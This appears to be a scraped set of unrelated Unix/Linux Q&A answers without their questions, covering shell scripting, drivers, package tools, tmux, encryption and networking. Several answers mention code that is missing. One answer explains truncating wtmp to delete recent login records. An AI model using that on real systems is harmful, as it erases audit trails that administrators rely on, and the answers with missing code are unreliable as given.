wireshark 's " follow tcp stream " feature shows the data payload that flows in both directions on the selected socket connection . so it matches up packets by socket connection , which is the combination of host1_ip_address:port &lt ; -> host2_ip_address:port . you can read more on wireshark 's web page at http://www.wireshark.org/docs/wsug_html_chunked/chadvfollowtcpsection.html
run your installation in a virtual machine . take a snapshot of a known good state . take snapshots before doing anything risky . do almost nothing in the host environment . if you screw up , connect to the host environment and restore the snapshot .
install etckeeper . on ubuntu , that is the etckeeper package . choose your favorite version control system ( amongst bazaar , darcs , git and mercury ) . run etckeeper init . now , every time you modify a configuration file , run sudo bzr commit from /etc ( or sudo git commit or whatever ) . also , every time you install , upgrade or remove a package , changes in /etc will be automatically committed to version control ( with a generic message , so it is best to commit manually with a meaningful message ) . to revert to an earlier version , use bzr revert ( or … ) .
just use the language you are the most comfortable with . this kind of application is not cpu-/memory-bound . you were mentioning Python . it is interpreted but i really do not see why this would be a problem . youtube/tornado/django/etc . run python . all the things that you will ever want for your specific purpose are already available as modules ( daemonize , http , etc . ) . PHP does not seem to be a good fit because of the limit that you mention , but also because you need apache ( not completely true , but whatever ) . still , it is possible . Java would also perfectly fit . you can also daemonize your process and use existing libraries . C/C++ seems a bit to much , but with the available libraries , you should be able to generate some working code very quickly . as manatwork stressed , bash also just fits . . . well , you guessed it , my point here is that for this kind of application , there is no " best language " . there is a family of language which already implement a http_client library of some sort and the others . your cpu and memory are not limiting . you can just enjoy the language you want . : ) but generally speaking , if this is your server , checking your web service is up should be checked internally ( cron job , nagios , etc . ) . from your home you may just want to ping the server to see if the hardware is up and responding .
you may also need to set a default route ( often known as your default gateway ) in /etc/sysconfig/network-scripts/route-eth0 as follows : default via 1.2.3.4  just make sure you substitute the correct default gateway for 1.2.3.4 otherwise bad things will happen . . . ; )
i was originally running kernel 3.7.4-204.fc18.i686 with kmod-wl-3.7.4-204.fc18.i686-5.100.82.112-7.fc18.8.i686 and the wireless had issues . after 2 more updates of the kernel it just works fine . so this is what i have running and working good now :
a tilde suffix marks a backup file for a few text editors , such as emacs ( '~' ) and vim ( ' . ext~' ) . some programs hide these files , as most people do not care about them . the only universal convention for a ' hidden ' file is a file with a leading ' . ' , due to a feature-like bug which was widely adopted .
if taskset can take a list of numbers one approach would be to do this to get a list of 4 random numbers : $ for (( i=1;i&lt;=16;i++ )) do echo $RANDOM $i; done|sort -k1|cut -d" " -f2|head -4 8 2 15 5  another rough idea would be to find a root random number and add 3 to it like this : examples ultimate solution chuu 's final solution ( as a 1-liner ) : $ RTEST=$(($RANDOM % 16));\ taskset -c "$((RTEST%16)),$(((RTEST + 1)%16)),$(((RTEST+2)%16)),$(((RTEST+3)%16))" rlwrap ...  how it works get a random number between 1-16: $ RTEST=$(($RANDOM % 16)); $ echo $RTEST 3  doing modulo division 4 times , adding 1 to $rtest prior to allows us to increment the numbers to generate the range : $ echo $((RTEST%16)),$(((RTEST + 1)%16)),$(((RTEST+2)%16)),$(((RTEST+3)%16)) 3,4,5,6  performing modulo division is a great way to box a number so that you get results in a specific range . $ echo $((RTEST%16)) 3 $ echo $(((RTEST + 3)%16)) 6  doing this guarantees that you will always get a number that is between 1-16 . it even handles the wrap around when we get random numbers that are above 13 . $ echo $(((14 + 3)%16)) 1 
because the plus glyph is a format specifier . in general , in unix programs , arguments with a minus glyph are options for the program and arguments with a plus glyph are commands for the program ( see man less ) . manual page man date shows more information on this topic .
you can use the [] notation to specify ranges of numbers and letters . repeat for multiple . this can also be used with --accept . for the query links there is no way to filter it out – however if you specify *\?* the files will be deleted after they have been downloaded . so you would have to live with it using bandwidth and time for downloading , but you do not have to do a cleanup afterwards . so , summa summarum , perhaps something like this : --reject='*.[0-9],*.[0-9][0-9],*\?*'  if this does not suffice you would have to look into other tools like the one mentioned in possible duplicate link under your question .
you can add compiz --replace line in your ~/.bashrc file , if you want to start it automatically on every login .
you can use a combination of sed and grep if you do not mind to reverse the ( extracted ) lines of the log file twice ( see how can i reverse the lines in a file ? ) .
tar is one of those ancient commands from the days when option syntax had not been standardized . because all useful invocations of tar require specifying an operation before providing any file name , most tar implementations interpret their first argument as an option even if it does not begin with a - . most current implementations accept a - ; the only exception that i am aware of is minix . older versions of posix and single unix included a tar command with no - before the operation specifier . single unix v2 had both traditional archivers cpio and tar , but very few flags could be standardized because existing implementations were too different , so the standards introduced a new command , pax , which is the only standard archiver in since single unix v3 . if you want standard compliance , use pax , but beware that many linux distributions do not include it in their base installation , and there is no pax in minix . if you want portability in practice , use tar cf filename.tar .
just needed to create a fake smp_lock.h file in /usr/src/linux-headers-$(uname -r)/include/linux/: sudo touch "/usr/src/linux-headers-$(uname -r)/include/linux/smp_lock.h  it works !
leave the newlines in ( just a standard -print ) , then sort , then remove the newlines : find | sort | sed ':a;N;$!ba;s/\\n/ /g' | xargs -0 yourcommand 
this is about the semantics of a depend atom ( a dependency ) specification . in the question you have : this is documented in section 5 of the ebuild manual ( man 5 ebuild ) : atom use defaults beginning with eapi 4 , use dependencies may specify default assumptions about values for flags that may or may not be missing from the iuse of the matched package . such defaults are specified by immediately following a flag with either ( + ) or ( - ) . use ( + ) to behave as if a missing flag is present and enabled , or ( - ) to behave as if it is present and disabled : Examples: media-video/ffmpeg[threads(+)] media-video/ffmpeg[-threads(-)]  accordingly here , this seems to indicate that the ebuild behavior about this abi_x86_32 flag should be to assume that if it is missing , it is present but disabled .
have you tried mod-auth external , it allows you to do your custom authentication mechanism for apache . it gives you access to environment variables such as ip , user , pass , etc . you can write a script in a language that you are familiar with and go fetch the authentication data from your database . the wiki has some examples . if you build a custom authentication script , make sure it is well coded ( security-wise ) . the module is available on centos ( mod_authnz_external ) and on ubuntu ( libapache2-mod-authnz-external ) here 's a basic apache configuration example : here 's the very simple script that logs the ip the user and the password , and accept the authentication only if the user provided is ' tony ' . in this particular example , the script is saved under /tmp/auth . sh with executable bit set . you can do whatever you want ( filter by ip , username , etc ) .
you can parse the second part of that filter thusly not ( (src and dest) net localnet )  it is shorthand for not src net localnet and not dest net localnet 
i have found the solution . the device was unclaimed because it was not known correctly by the kernel . using a kernel 3.5 , the device was listed as below : but it was still unclaimed . when searching for the device [ 1b21:0611 ] i found a post in the kernel mailing list talking about it . it tells that the kernel does not identify the device correctly as an ahci device and propose a patch to the kernel . i applied the patch to the source of kernel 3.5 and recompiled and it is now working . for information , the patch is included in the kernel in the release 3.6 and above .
i think your requirement is valid , but on the other hand it is also difficult , because you are mixing symmetric and asymmetric encryption . please correct me if i am wrong . reasoning : the passphrase for your private key is to protect your private key and nothing else . this leads to the following situation : you want to use your private key to encrypt something that only you can decrypt . your private key is not intended for that , your public key is there to do that . whatever you encrypt with your private key can be decrypted by your public key ( signing ) , that is certainly not what you want . ( whatever gets encrypted by your public key can only be decrypted by your private key . ) so you need to use your public key to encrypt your data , but for that , you do not need your private key passphrase for that . only if you want to decrypt it you would need your private key and the passphrase . conclusion : basically you want to re-use your passphrase for symmetric encryption . the only program you would want to give your passphrase is ssh-agent and this program does not do encryption/decryption only with the passphrase . the passphrase is only there to unlock your private key and then forgotten . recommendation : use openssl enc or gpg -e --symmetric with passphrase-protected keyfiles for encryption . if you need to share the information , you can use the public key infrastucture of both programs to create a pki/web of trust . with openssl , something like this : $ openssl enc -aes-256-cbc -in my.pdf -out mydata.enc  and decryption something like $ openssl enc -aes-256-cbc -d -in mydata.enc -out mydecrypted.pdf 
you need to use the eval expression #!/bin/bash VER_URXVT='urxvt -help 2&gt;&amp;1 | head -n 2' echo $VER_URXVT eval $VER_URXVT  from the man page eval
it depends on how much each process is writing ( assuming your os is posix-compliant in this regard ) . from write(): write requests to a pipe or fifo shall be handled in the same way as a regular file with the following exceptions : [ . . . ] write requests of {pipe_buf} bytes or less shall not be interleaved with data from other processes doing writes on the same pipe . writes of greater than {pipe_buf} bytes may have data interleaved , on arbitrary boundaries , with writes by other processes , whether or not the o_nonblock flag of the file status flags is set . also in the rational section regarding pipes and fifos : atomic/non-atomic : a write is atomic if the whole amount written in one operation is not interleaved with data from any other process . this is useful when there are multiple writers sending data to a single reader . applications need to know how large a write request can be expected to be performed atomically . this maximum is called {pipe_buf} . this volume of posix . 1-2008 does not say whether write requests for more than {pipe_buf} bytes are atomic , but requires that writes of {pipe_buf} or fewer bytes shall be atomic . the value if PIPE_BUF is defined by each implementation , but the minimum is 512 bytes ( see limits.h ) . on linux , it is 4096 bytes ( see pipe(7) ) .
in some shells ( including bash ) : IFS=: command eval 'p=($PATH)'  ( with bash , you can omit the command if not in sh/posix emulation ) . but beware that when using unquoted variables , you also generally need to set -f , and there is no local scope for that in most shells . with zsh , you can do : (){ local IFS=:; p=($=PATH); }  $=PATH is to force word splitting which is not done by default in zsh ( globbing upon variable expansion is not done either so you do not need set -f unless in sh emulation ) . (){...} ( or function {...} ) are called anonymous functions and are typically used to set a local scope . with other shells that support local scope in functions , you could do something similar with : e() { eval "$@"; } e 'local IFS=:; p=($PATH)'  to implement a local scope for variables and options in posix shells , you can also use the functions provided at https://github.com/stephane-chazelas/misc-scripts/blob/master/locvar.sh . then you can use it as : . /path/to/locvar.sh var=3,2,2 call eval 'locvar IFS; locopt -f; IFS=,; set -- $var; a=$1 b=$2 c=$3'  ( by the way , it is invalid to split $PATH that way above except in zsh as in other shells , ifs is field delimiter , not field separator ) . IFS=$'\\n' a=($str)  is just two assignments , one after the other just like a=1 b=2 . a note of explanation on var=value cmd: in : var=value cmd arg  the shell executes /path/to/cmd in a new process and passes cmd and arg in argv[] and var=value in envp[] . that is not really a variable assignment , but more passing environment variables to the executed command . in the bourne or korn shell , with set -k , you can even write it cmd var=value arg . now , that does not apply to builtins or functions which are not executed . in the bourne shell , in var=value some-builtin , var ends up being set afterwards , just like with var=value alone . that means for instance that the behaviour of var=value echo foo ( which is not useful ) varies depending on whether echo is builtin or not . posix and/or ksh changed that in that that bourne behaviour only happens for a category of builtins called special builtins . eval is a special builtin , read is not . for non special builtin , var=value builtin sets var only for the execution of the builtin which makes it behave similarly to when an external command is being run . the command command can be used to remove the special attribute of those special builtins . what posix overlooked though is that for the eval and . builtins , that would mean that shells would have to implement a variable stack ( even though it does not specify the local or typeset scope limiting commands ) , because you could do : a=0; a=1 command eval 'a=2 command eval echo \$a; echo $a'; echo $a  or even : a=1 command eval myfunction  with myfunction being a function using or setting $a and potentially calling command eval . that was really an overlook because ksh ( which the spec is mostly based on ) did not implement it ( and at and t ksh and zsh still do not ) , but nowadays , except those two , most shells implement it . behaviour varies among shells though in things like : a=0; a=1 command eval a=2; echo "$a"  though . using local on shells that support it is a more reliable way to implement local scope .
-c means that you want to know the number of times this user is in /etc/passwd , while $? is the exit code . those are differents , since the number of times is printed on stdout . use $() for getting stdout into a variable second problem : all your variables , like $uzer will not be substituted with their values when in single quotes . use double quotes . number=$(grep -c "^${uzer}:" /etc/passwd) if [ $number -gt 0 ]; then echo "User does exist :)" else echo "No such user" fi 
there are several intel drivers options which , if they do not work perfectly with your hardware , can cause issues like this : the big one is lvds_downclock , but it defaults to off . if you have changed that default , that is the first one to try . ( it is possible some kernel versions defaulted to on , so its worth a try to force-disable it ) . i915_enable_fbc can cause various display issues . the default is per-chip , you may want to try turning it off . both of the above will probably increase power usage a little . finally , powersave defaults to true , turning it off will disable a bunch of powersaving stuff at once . this will probably work , but you will notice the battery life hit . there are two ways to set these values : on the kernel command line , like this : i915.i915_enable_fbc=0 . yes , you need the i915. prefix , even when the option name starts with i915 . you can test temporarily by editing the command line in grub before booting , and set permanently in the grub config ( edit /etc/default/grub , then run update-grub . or dpkg-reconfigure grub-pc ) . create a new file in /etc/modprobe.d , for example /etc/modprobe.d/local-i915.conf . then inside it , put options i915 i915_enable_fbc=0 lvds_downclock=0 ( etc . ) . note that you do not use the i915. prefix here . after editing , run update-initramfs -u . another option is to try a newer kernel . currently , debian backports has 3.12 . newer kernels have fixed a lot of bugs in the intel video driver , and also have better knowledge of when which hardware particular powersaving features work on .
add -o Acquire::ForceIPv4=true when running apt-get . if you want to make the setting persistent just create /etc/apt/apt . conf . d/99force-ipv4 and put Acquire::ForceIPv4 true; in it . config options Acquire::ForceIPv4 and Acquire::ForceIPv6 were added to version 0.9.7.9~exp1 ( see bug 611891 ) which is available in ubuntu saucy ( released in october 2013 ) and debian jessie ( not released yet ) .
linux initially boots with a ramdisk ( called an initrd , for " initial ramdisk" ) as / . this disk has just enough on it to be able to find the real root partition ( including any driver and filesystem modules required ) . it mounts the root partition onto a temporary mount point on the initrd , then invokes pivot_root(8) to swap the root and temporary mount points , leaving the initrd in a position to be umounted and the actual root filesystem on / .
linpus linux is a fedora-based distribution of linux . a distribution is the linux kernel plus bundled software that makes it generally useable ( think file manager , command line interface , software installer etc . ) . linpus was designed to be easy to use and is targeted specifically at the asian market . linux is the kernel at the heart of all linux distributions i.e. the software that sits between your software and your hardware , enabling the two to communicate . if you are asking the question , chances are you are not yet at the level to work your way up from the kernel and few people even experts do that anyway . so , regardless of what may be wrong or right about linpus , i would cross " linux " off your list . linux distributions that are considered entry level and which may be of interest to you include ubuntu , linux mint and mageia and surely some others too .
kpartx uses the device mapper tools to create devices over the underlying media ; you should be able to implement your partition parser in userspace and create dm mappings that expose parts of the underlying system to the kernel as block devices . that absolves you of all the complexity of in-kernel work , and should still support booting through an initramfs , if required .
you can use a one-liner loop like this : for f in file1 file2 file3; do sed -i "s/$/\t$f/" $f; done  for each file in the list , this will use sed to append to the end of each line a tab and the filename . explanation : using the -i flag with sed to perform a replacement in-place , overwriting the file perform a substitution with s/PATTERN/REPLACEMENT/ . in this example pattern is $ , the end of the line , and replacement is \t ( = a tab ) , and $f is the filename , from the loop variable . the s/// command is within double-quotes so that the shell can expand variables .
have you looked into soapui instead of writing your own load testing routine ?
this worked out fine for me : ./a.out | aplay 
use unset as last line in your .bashrc: unset -f do_stuff  will delete/unset the function do_stuff . to delete/unset the variables invoke it as follows : unset variablename 
parentheses denote a subshell in bash . to quote the man page : where a list is just a normal sequence of commands . this is actually quite portable and not specific to just bash though . the posix shell command language spec has the following description for the (compound-list) syntax : execute compound-list in a subshell environment ; see shell execution environment . variable assignments and built-in commands that affect the environment shall not remain in effect after the list finishes .
have you tried this ? ftp://download.nvidia.com/opensuse/12.1/i586/
using awk: awk -F'[| ]' '{if ( $1 ~ /^>/ ) print ">"$2; else print $0}' file >3931 GACAAACGCTGGCGGGTGCATGAG if the whitespace between the end of the first string and the beginning of the set of digits before the pipe is a tab , not a space , the regex to set the field delimiter would be [|\t] .
build a kickstart server and a kickstart configuration file that specifies your disk layout , packages to be installed and a %post section . in this later section you can deploy any number of scripts ( shell , perl , etc . ) from your kickstart server that will be executed to customize your basic configuration . the time you invest setting up a kickstart server will be well worth the effort . have a look at the red hat documentation here .
have the at-script call itself once it is done . # cat t.txt true cat t.txt | at 9am mon # bash t.txt warning: commands will be executed using /bin/sh job 680 at Mon Sep 8 09:00:00 2014 #  just replace true with your actual script .
looks like the svnadmin binary is just a layer of code that wraps a shared library to do the actual work ( including the version number ) . indeed , if i run strings $(which svnadmin) , the version message does not appear in the output , so it is not part of the svnadmin binary . so , a difference in the ld_library_path between your interactive session and cron could explain the difference in behavior .
use the -l option to ssh-add to list them by fingerprint . $ ssh-add -l 2048 72:...:eb /home/gert/.ssh/mykey (RSA)  or with -L to get the full key in openssh format . $ ssh-add -L ssh-rsa AAAAB3NzaC1yc[...]B63SQ== /home/gert/.ssh/id_rsa  the latter format is the same as you would put them in a ~/.ssh/authorized_keys file .
to run a jar file , pass the -jar option to java . otherwise it assumes the given argument is the name of a class , not the name of a jar file ( specifically in this case it is looking for a class named jar in a the package iCChecker ) . so java -jar iCChecker.jar will work .
you can find all messages in /var/log/syslog and in other /var/log/ files . old messages are in /var/log/syslog.1 , /var/log/syslog.2.gz etc . if logrotate is installed . however , if the kernel really locks up , the probability is low that you will find any related message . it could be , that only the x server locks up . in this case , you can usually still access the pc over network via ssh ( if you have installed it ) . there is also the magic sysrq key to unraw the keyboard such that the shortcuts you tried could work , too .
you can use the -mindepth parameter from find , to prevent it from matching . in the target directory . this should resolve your issues . find /path/to/dir/ -mindepth 1 -maxdepth 1 -type d -exec rm -rf {} + 
you are in zsh , not bash . in zsh , repeat ( inspired from csh repeat ) is a construct used to repeat commands . repeat 10 echo foo  would echo foo 10 times . if you want to call your repeat , you had need to quote it so that it is not taken as the repeat reserved word . best would be to use something else for your function name though .
did you do echo $TMUX , while in a tmux session ? because TMUX is only set , when in a session . try that instead : [ -z "$TMUX" ] &amp;&amp; command -v tmux &gt;/dev/null &amp;&amp; TERM=xterm-256color exec tmux 
the script below will do the task find . -type f \( -name "*.js" ! -name "*-min*" \) | while IFS= read -r line do cat "$line" echo done &gt;all.js 
you could do : trap '__=$_; timer_start; : "$__"' DEBUG 
well i think that KillMode=process in the service definition will do what you want , but it really sounds like you are going about things the wrong way . . . maybe this script should be a separate service that the first one requires ?
try with printf :  for((i=32;i&lt;=127;i++)) do printf \\$(printf '%03o\t' "$i"); done;printf "\\n"  see also : BASH FAQ
these are repositories for source packages . see the sources.list man page .
something along the lines ( depending on your shell ) of for file in rb-script/*.rb; do ruby "$file"; done  should do the trick ; alternatively ( and shell-independently , i think ) find rb-script -type f -exec ruby "{}" \;  using find ; where you can , depending on your situation , be more specific , à la find rb-script -maxdepth 1 -type f -name '*.rb' -exec ruby "{}" \;  in general , command &lt;glob-pattern&gt; would also work if command accepts several files ( and there are less files than the commandline argument maximum of your shell ) , but i doubt ruby does that . ( you could write a wrapper script such that ruby-wrapper rb-script/*.rb would do what you want , though . )
i believe the histtimeformat is for bash shells . if you are using zsh then you could use these switches to the history command : examples if you do a man zshoptions or man zshbuiltins you can find out more information about these switches as well as other info related to history . excerpt from zshbuiltins man page debugging invocation you can use the following 2 methods to debug zsh when you invoke it . method #1 $ zsh -xv  method #2 $ zsh $ setopt XTRACE VERBOSE  in either case you should see something like this when it starts up :
the wtmp file is a sequence of struct utmp records . to remove the last 10 records , you first discover the size of a utmp record , then you truncate the wtmp file to its current size minus the ten times the size of a utmp record . a simple c program will give you the size of a utmp record . #include &lt;utmp.h&gt; #include &lt;stdio.h&gt; struct utmp foo; main() { printf("%lu\\n", sizeof foo); return 0; }  and a perl script will truncate the wtmp file
you can do some process | logger &amp;  to spawn processes and have their output directed to syslog . notice that the default facility will be “user” and the default level “notice” . you can change them using the -p option . the reason why this works without probelm is that the processes do not directly write to the destination file . they send their messages to the syslog daemon , which manages writing to the appropriate file ( s ) . as far as i understand things , the atomicity would be line-based , i.e. every line of output from a process would go to syslog without interference , but multi-line messages might get lines from other processes mixed in .
those sources might be outdated , which is very common in the foss community . answer aping is also common , so outdated information can be spread years after its obsolescence . i will say the support is still considered a wip , but it does exist . the project is called bumblebee ( its a play on optimus prime ) . the best guide i have seen online is at the arch wiki .
the only problem i can see is bugzilla 4.2 seems not to be available on fedora 's repositories , so yum will not be able to find it . you might have to do a new manual installation or look for a 3rd party repository with bugzilla 4.2 already packaged .
i was able to use some of the examples from the same article on so , titled : how to get the cursor position in bash ? . i am posting this here just to show that they work and that the contents of solutions is actually on u and l as well . bash solutions from inside a script note : i changed the output slightly ! example $ ./rowcol.bash (row,col): 43,0 $ clear $ ./rowcol.bash (row,col): 1,0  interactive shell this command chain worked for getting the row and column positions of the cursor : $ echo -en "\E[6n";read -sdR CURPOS; CURPOS=${CURPOS#*[};echo "${CURPOS}"  example note : this method does not appear to be usable from any type of script . even simple commands in an interactive terminal did not work for me . for example : $ pos=$(echo -en "\E[6n";read -sdR CURPOS; CURPOS=${CURPOS#*[};echo "${CURPOS}")  just hangs indefinitely . dash/sh solutions from inside a script this solution is for ubuntu/debian systems that come stock with dash , which is posix compliant . because of this , the read command does not support the -d switch among other differences . to get around this there is this solution which uses a sleep 1 in place of the -d switch . this is not ideal but offers at least a working solution . example $ ./rowcol.sh (row,col): 0,24 $ clear $ ./rowcol.sh (row,col): 0,1  interactive shell i could not find a workable solution that worked for just sh in an interactive shell .
here 's a perl script that opens files ( given as command line arguments ) in utf-16 ( endianness detected via bom ) , and counts the lines . ( dies if the bom is not understood . )
mplayer takes a -softvol flag that makes it use the software audio mixer instead of the sound card . if you want it on permanently , you can add the following to ~/.mplayer/config: softvol=true 
unfortunately , that does not appear to be possible with current versions of mutt . $index_format supports a specific set of format specifiers , drawing from various message metadata . it is described in the mutt manual ( or here is the " stable " version 's documentation for the same ) , and as you can see from the table , there are only a few format specifiers that are conditional . those are %M , %y and %Y ; %m is the number of hidden messages if the thread is collapsed , and %y and %y are x-label headers if present . the actual formatting of the message date and time is done by strftime(3) , which does not support conditional formatting at all . it might be possible to do an ugly workaround by continually rewriting the message files ' Date: headers , but i would not want to do that at least . however , it is the least bad possibility that i can think of . the only real solution i can think of would be to either implement such support in mutt ( which almost certainly is how thunderbird does it ) , or write a replacement strftime which supports conditional formatting and inject that using ld_preload or a similar mechanism . the latter , however , will affect all date and time display in mutt that goes through strftime , not only relating to the message index .
the boost packages are slotted , so you can actually have more than one version installed . to emerge that version , simply issue : emerge -a =dev-libs/boost-1.39.0  if you want to remove the newer version ( quite dangerous , you could have a lot of stuff dependent on it ) , you could : emerge --unmerge =dev-libs/boost-1.46.1-r1  and run a revdep-rebuild afterwards . to switch your environment from one version to the other ( if you kept both ) , use eselect boost list/set .
try making both stdout and stderr unbuffered . stdbuf -e 0 -o 0 ./myprogram |&amp; tee mylog  edit : i replaced my original answer . the above is most likely a solution to the problem .
there are effectively two main distributions ( not trying to disparage anyone , just pointing out this is becoming a defacto standard ) . debian redhat from debian , the following are derived ( directly or indirectly ) : ubuntu mint and many more . . . from redhat , the following are derived ( directly or indirectly ) : fedora mandriva centos and many more . . . there are three other major distros that are worth mentioning outside of the debian/redhat camp : arch slackware suse as far as linux is concerned start by picking one from the debian camp ( i recommend debian sid ) and one from the redhat camp ( i recommend centos ) . throw in arch and suse because if you do not have a package for those some people will not even bother . anybody using slackware probably has the chops to get it working on their own and then send you patches . do not worry about supporting anything that is more than a year out of date . if people try it you will hear about it and if the fix is easy , go for it . if it is hard tell them to upgrade to something supported . if you are interested in even wider availability i would also recommend adding non-linux systems : solaris 11 omnios freebsd but ultimately , it will depend on how much time you are willing to spend on each platform . and that is the question you really need to answer for yourself . is the investment of your time worth it to you ?
change your config to match this : source : https://help.gmx.com/en/applications/pop3.html
every directory has a reference to itself , named . . that is a hard link , it actually exists as an entry in the directory itself . every directory has a reference ( again , a hard link ) to its parent directory , named .. what you see is the contents of a directory with no files or subdirectories in it . since the date on . is july 5 , and the date on .. is july 3 , something happened in . after it was created , after something happened in .. by " something happened " , i mean file or directory creation or deletion .
based on http://askubuntu.com/questions/150790/how-do-i-run-a-script-on-a-dbus-signal just stick that in /etc/init . d/monitor-for-unlock , make it executable , and then make a soft link in rc2 . d chmod +x /etc/init.d/monitor-for-unlock cd /etc/rc2.d ln -s /etc/init.d/monitor-for-unlock . 
in a way yes : you will be able to switch away from all the fancy new stuff and just use the gnome-panels like you did with gnome 2 . in this mode it should not be too difficult to replace the wm . however , in standard , fancy mode you will only be able to use mutter aka metacity 3 . gnome 3 is just too different , it uses lots and lots of composite effects to provide the overlay , animations and a new concept of workspace .
you can misuse /root/ . ssh/rc for your purpose ( see man sshd ) and include a mailx command there .
there are basicly 2 ' standard ' tools for partions : truecrypt - cross-platform , open , plausible deniability dm-crypt - linux-specific , uses linux crypto api , can take advantages of any crypto hardware acceleration linux supports , and device-mapper . there is also cryptoloop , dm-crypt 's predecessor
variables are not expanded between single quotes . use double quotes and escape the inner double quotes : sshpass -p "password" \ ssh username@74.11.11.11 "su -lc \"cp -r $location2 $location1\";"  or close the single quotes and open them again : sshpass -p "password" \ ssh username@74.11.11.11 'su -lc "cp -r '$location2' '$location1'";'  bash does string concatenation automatically . note : not tested . might screw up misserably if $locationX contains spaces or other weird characters .
this would appear to be the process , gpk-update-icon that is responsible for this authentication window being popped open . you could try this solution : sorry for the misunderstanding . the app is for the gnome package kit , many people have reported that they fixed it by removing gnome and using another window manager , and other have said that you can go to system-> preferences-> personal-> sessions and untick " packagekit update applet " to stop the applet . source : http://www.linux.com/community/forums/desktop/gpk-update-icon i would merely try unticking the " packagekit update applet " as a workaround .
your question is a bit confusing , as you refer to a text-based mail client and a php application and then specify that " the application " ( i.e. . your php application ) to store email ( or data extracted from that ) in a database . you can and probably should separate your sending application from your response processing application . the response processing can be done by calling any script from procmail , for that you need a . procmailrc file in the home directory of the receiving user that has the following : :0 * ^Subject:.*[response-email] | /path/to/your_script  you can leave out the subject line if you want all mails to that email address processed , or use different selection criteria . as for your_script i do not know of any commandline mail clients that directly put your material in a database . since you probably should test the response anyway ( if not to extract some extra database fields , at least to throw away spam ) you might want to write your_script in php using pecl to parse its content and store it in your database . ( of course you can use other languages you are familiar with for this purpose as well ) . if you are using postfix to receive emails on the machine this script runs on , make sure to call procmail in /etc/postfix/main . cf : mailbox_command = procmail -a "$EXTENSION" 
you can use find: find . -name "*.js" -exec java -jar compiler.jar --js {} --js_output_file new{} \; 
sak in this case really means secure attention key . the message you are seeing is a kernel message defined in drivers/tty/tty_io . c . sak is a key combination which ensures secure login for a user on console . on linux sak ensures this by killing all processes attached to the terminal sak is invoked on . it is expected that init will then restart the trusted login process like getty followed by login or x server with display manager . the listed pids are indeed pids of threads of your application CX_SC3 which were killed by sak . fd#n opened to the tty means that the process/thread which was killed had the file descriptor n opened to the terminal on which the sak was invoked . in linux there are two ways of invoking sak : through the magic sysrq key - typically alt + sysrq + k ( virtual terminal ) or break k ( serial console ) . this is not your case as you already tried to disable the magic sysrq by echo 0 &gt; /proc/sys/kernel/sysrq and sending the break k sequence by accident is improbable . through a defined key sequence ( virtual terminal ) or the break signal ( serial console ) . sak availability on a serial console is controlled by setserial . break signal on a serial line is continuous sending of spacing values over a time longer than the character sending time ( including start , stop and parity bits ) . in you case it is highly probable that the condition of the break signal appears during shutting your host machine down . please try to turn the sak off on your serial port on the target device by setserial: setserial /dev/ttyS0 ^sak  you can check the sak functionality status on the serial port by setserial -g /dev/ttyS0 . when turned on it will show SAK after Flags: . for automatic setting of the option after boot see the startup scripts which on busybox systems are usually /etc/init.d/rcS and /etc/rc.d/S* or check /etc/inittab for other possibilities .
there are several ways that you can find a port , including your echo technique . to start , there is the ports site where you can search by name or get a full list of available ports . you can also try : whereis &lt;program&gt;  but this--like using echo--will not work unless you type the exact name of the port . for example , gnome-terminal works fine but postgres returns nothing . another way is : cd /usr/ports make search name=&lt;program&gt;  but keep in mind that this will not return a nice list ; it returns several \\n delimited fields , so grep as necessary . i have used both of the above methods in the past but nowadays i just use find: find /usr/ports -name=&lt;program&gt; -print  lastly , i will refer you to the finding your application section of the handbook which lists these methods along with sites like fresh ports which is handy for tracking updates .
your command also has another problem , what if the filename has spaces ? #!/bin/bash cat "$1"  always quote unless you have a compelling reason not to . and cat "" does not hang .
the command to do this is join-pane in tmux 1.4 . to simplify this , i have these binds in my .tmux.conf for that : the first grabs the pane from the target window and joins it to the current , the second does the reverse . you can then reload your tmux session by running the following from within the session : $ tmux source-file ~/.tmux.conf 
the problem here , as is so often the case , is about the different types of shell : when you open a terminal emulator ( gnome-terminal for example ) , you are executing what is known as an interactive , non-login shell . when you log into your machine from the command line , or run a command such as su username , or sudo -u username , you are running an interactive login shell . so , depending on what type of shell you have started , a different set of startup files are read . from man bash: in other words , ~/.bashrc is ignored by login shells . since you are using the -i option to sudo , the startup files for the user 's login shell are being read ( from man sudo ) : so , what you can do is define the function in the user 's ~/.profile or ~/.bash_profile instead . bear in mind that ~/.profile is ignored if ~/.bash_profile exists . also keep in mind that ~/.bash_profile is bash-specific so i would use .profile instead , just make sure that ~/.bash_profile does not exist . source ~/.nvm/nvm.sh from ~/.profile .
see stackexchange-url the easiest method , based on one of the suggestions in the top-voted answer , is probably this : (echo -n "$user:$realm:" &amp;&amp; echo -n "$user:$realm:$password" | md5sum | awk '{print $1}' ) &gt;&gt; /etc/apache2/pw/$user i have used md5sum from gnu coreutils and awk rather than just md5 because it is what i have installed on my system and i could not be bothered finding out which package has /usr/bin/md5 - you could also use sha512sum or other hashing program . e.g. if user=foo , realm=bar , and password=baz then the command above will produce : foo:bar:5bf2a4095f681d1c674655a55af66c5a htdigest does not do anything magical or even unusual - it just outputs the user , realm , and password in the right format . . . as the command above does . deleting the digest for a given user:realm instead of just adding one , can easily be done with sed . updating/changing the digest for a user:realm can also be done with sed in combination with the method above to generate the digest line . e.g.
for technically unknown reasons , it was found ( by accident ) that both lcd 's work if one of them is connected with vga cable to its analog input , using dvi output of the graphics card with dvi-to-vga adaptor . it also matters which dvi output is used with the dvi-to-vga adaptor ; if i swap dvi connectors , one of the panels will be blank again . go figure .
put this in your ~/.inputrc:: "\M-l": "ls -ltrF\r" 
pdftk is able to cut out a fixed set of pages efficiently . with a bit of scripting glue , this does what i want : this assumes that you have the number of pages per chunk in $pagesper and the filename of the source pdf in $file . if you have acroread installed , you can also use acroread -size a4 -start "$start" -end "$end" -pairs "$file" "${filename}_${counterstring}.ps"  acroread offers the option -toPostScript which may be useful .
note that although you need to remove the commas from your input before adding the values to your total , but awk is happy to print your results with or without thousands separators . as an example , if you use the following code : look at fmt variable defined in code . your input : $ cat file 2014-01 2,277.40 2014-02 2,282.20 2014-03 3,047.90 2014-04 4,127.60 2014-05 5,117.60  awk code : $ awk '{gsub(/,/,"",$2);sum+=$2}END{printf(fmt,sum)}' fmt="%'6.3f\\n" file  resulting : 16,852.700  if you want to try this on a Solaris/SunOS system , change awk at the start of this script to /usr/xpg4/bin/awk , /usr/xpg6/bin/awk , or nawk . hope this will be useful .
make mycd a function so the cd command executes in your current shell . save it in your ~/ . bashrc file .
